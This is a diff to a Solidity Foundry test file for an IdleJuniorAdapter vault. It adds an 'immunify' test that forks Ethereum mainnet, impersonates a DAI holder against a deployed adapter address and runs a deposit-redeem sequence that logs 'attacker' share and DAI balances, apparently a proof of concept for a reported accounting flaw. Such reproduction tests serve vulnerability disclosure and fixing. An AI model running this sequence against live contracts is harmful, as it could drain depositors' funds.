@@ -90,13 +90,95 @@ contract IdleJuniorAdapterTest is AbstractAdapterTest {
     }
 
     /*//////////////////////////////////////////////////////////////
+                            IMMUNIFY
+    //////////////////////////////////////////////////////////////*/
+
+    function logValues(
+        IdleJuniorAdapter daiIdleJuniorAdapter,
+        IERC20 tranche,
+        IERC20 dai,
+        string memory prefix
+    ) internal {
+        uint256 oldTotalAssets = daiIdleJuniorAdapter.totalAssets();
+        uint256 oldTotalSupply = daiIdleJuniorAdapter.totalSupply();
+        uint256 oldIouBalance = tranche.balanceOf(
+            address(daiIdleJuniorAdapter)
+        );
+        uint256 oldAssetBalance = dai.balanceOf(address(daiIdleJuniorAdapter));
+
+        emit log_named_uint(
+            string.concat(prefix, "totalAssets"),
+            oldTotalAssets
+        );
+        emit log_named_uint(
+            string.concat(prefix, "totalSupply"),
+            oldTotalSupply
+        );
+        emit log_named_uint(string.concat(prefix, "iouBalance"), oldIouBalance);
+        emit log_named_uint(
+            string.concat(prefix, "assetBalance"),
+            oldAssetBalance
+        );
+    }
+
+    function test__immunify() public {
+        uint256 forkId = vm.createSelectFork(vm.rpcUrl("mainnet"), 18211623);
+        vm.selectFork(forkId);
+
+        address daiWhale = 0x075e72a5eDf65F0A5f44699c7654C1a76941Ddc8;
+        IdleJuniorAdapter daiIdleJuniorAdapter = IdleJuniorAdapter(
+            0x197F58De2559097d956b4192e8F89A2F36190a48
+        );
+        IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
+        IERC20 tranche = IERC20(0x38D36353D07CfB92650822D9c31fB4AdA1c73D6E);
+
+        vm.startPrank(daiWhale);
+        dai.approve(address(daiIdleJuniorAdapter), type(uint256).max);
+        daiIdleJuniorAdapter.deposit(1000e18, daiWhale);
+        vm.stopPrank();
+
+        logValues(daiIdleJuniorAdapter, tranche, dai, "old-");
+
+        vm.roll(block.number + 1);
+
+        vm.prank(daiWhale);
+        daiIdleJuniorAdapter.redeem(1, daiWhale, daiWhale);
+
+        logValues(daiIdleJuniorAdapter, tranche, dai, "new-");
+
+        vm.prank(daiWhale);
+        daiIdleJuniorAdapter.deposit(1000e18, daiWhale);
+
+        vm.roll(block.number + 1);
+
+        uint256 oldAttackerShares = IERC20(address(daiIdleJuniorAdapter))
+            .balanceOf(daiWhale);
+        uint256 oldAttackerdai = dai.balanceOf(daiWhale);
+
+        emit log_named_uint("oldAttackerShares", oldAttackerShares);
+        emit log_named_uint("oldAttackerdai", oldAttackerdai);
+
+        vm.prank(daiWhale);
+        daiIdleJuniorAdapter.redeem(oldAttackerShares, daiWhale, daiWhale);
+
+        uint256 newAttackerShares = IERC20(address(daiIdleJuniorAdapter))
+            .balanceOf(daiWhale);
+        uint256 newAttackerdai = dai.balanceOf(daiWhale);
+
+        emit log_named_uint("newAttackerShares", newAttackerShares);
+        emit log_named_uint("newAttackerdai", newAttackerdai);
+
+        logValues(daiIdleJuniorAdapter, tranche, dai, "latest-");
+    }
+
+    /*//////////////////////////////////////////////////////////////
                           INITIALIZATION
     //////////////////////////////////////////////////////////////*/
 
     function test__initialization() public override {
         createAdapter();
         uint256 callTime = block.timestamp;
-        
+
         vm.expectEmit(false, false, false, true, address(adapter));
         emit Initialized(uint8(1));
         adapter.initialize(
